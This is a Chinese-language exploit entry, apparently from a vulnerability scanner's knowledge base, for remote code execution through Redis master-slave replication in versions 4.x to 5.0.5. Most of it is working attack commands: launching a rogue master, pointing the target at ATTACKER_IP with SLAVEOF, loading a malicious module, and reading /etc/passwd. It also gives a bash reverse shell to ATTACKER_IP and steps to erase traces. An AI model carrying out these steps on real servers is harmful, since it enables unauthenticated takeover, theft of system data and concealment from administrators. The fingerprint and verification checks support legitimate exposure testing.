---
id: REDIS-MASTER-SLAVE-RCE
title: Redis 主从复制远程代码执行漏洞
product: redis
vendor: Redis
version_affected: "4.x, 5.0.0 - 5.0.5"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Redis", "redis_version"]
---

## 漏洞描述

Redis 4.x 及 5.0.5 之前版本中，攻击者可利用主从复制功能加载恶意 Redis 模块（.so 文件）实现远程代码执行。攻击者搭建一个恶意 Redis 主节点（rogue server），通过 SLAVEOF 命令让目标 Redis 成为从节点，在全量同步过程中将恶意 .so 模块文件传输到目标，再通过 MODULE LOAD 加载执行，最终获得系统命令执行能力。

## 影响版本

- Redis 4.x 全版本
- Redis 5.0.0 - 5.0.5

## 前置条件

- 无需认证（目标 Redis 未设置密码）或已知密码
- 目标 Redis 端口可访问（默认6379）
- 攻击者需控制一台可被目标 Redis 访问的服务器（用于搭建 rogue server）

## 利用步骤

1. 在攻击机上启动 redis-rogue-server（模拟恶意主节点）
2. 连接目标 Redis，执行 SLAVEOF 命令指向攻击机
3. rogue server 在全量同步时发送恶意 .so 模块
4. 目标 Redis 加载模块后获得命令执行能力
5. 通过模块提供的函数（如 system.exec）执行系统命令

## Payload

### 使用 redis-rogue-server 工具

```bash
# 工具地址: https://github.com/n0b0dyCN/redis-rogue-server
# 在攻击机上运行
python3 redis-rogue-server.py --rhost target --rport 6379 --lhost ATTACKER_IP --lport 21000
```

### 手动利用流程（使用 redis-cli）

```bash
# Step 1: 在攻击机上启动 rogue server（需要准备 exp.so 模块）
# 使用 https://github.com/n0b0dyCN/RedisModules-ExecuteCommand 编译

# Step 2: 连接目标 Redis，设置主从复制
redis-cli -h target -p 6379
> SLAVEOF ATTACKER_IP 21000
# 等待同步完成（rogue server 会发送 exp.so）

# Step 3: 加载模块
> MODULE LOAD /tmp/exp.so
# 或者 MODULE LOAD ./exp.so（取决于文件落地位置）

# Step 4: 执行系统命令
> system.exec "id"
> system.exec "cat /etc/passwd"

# Step 5: 反弹 shell
> system.exec "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# Step 6: 清理痕迹
> SLAVEOF NO ONE
> MODULE UNLOAD system
```

### 带密码认证的利用

```bash
# 如果已知 Redis 密码
python3 redis-rogue-server.py --rhost target --rport 6379 --lhost ATTACKER_IP --lport 21000 --passwd "redis_password"
```

## 验证方法

```bash
# 1. 确认 Redis 未授权访问
redis-cli -h target -p 6379 INFO server | grep "redis_version"

# 2. 确认版本在影响范围内
redis-cli -h target -p 6379 INFO server | grep "redis_version" | grep -E "4\.|5\.0\.[0-5]"

# 3. 利用后验证 — 使用 system.exec 执行 id
redis-cli -h target -p 6379 system.exec "id"
```

## 指纹确认

```bash
# Redis 服务探测
redis-cli -h target -p 6379 PING
# 返回 PONG 即为 Redis

redis-cli -h target -p 6379 INFO server | head -5
```

## 参考链接

- https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
- https://github.com/n0b0dyCN/redis-rogue-server
- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
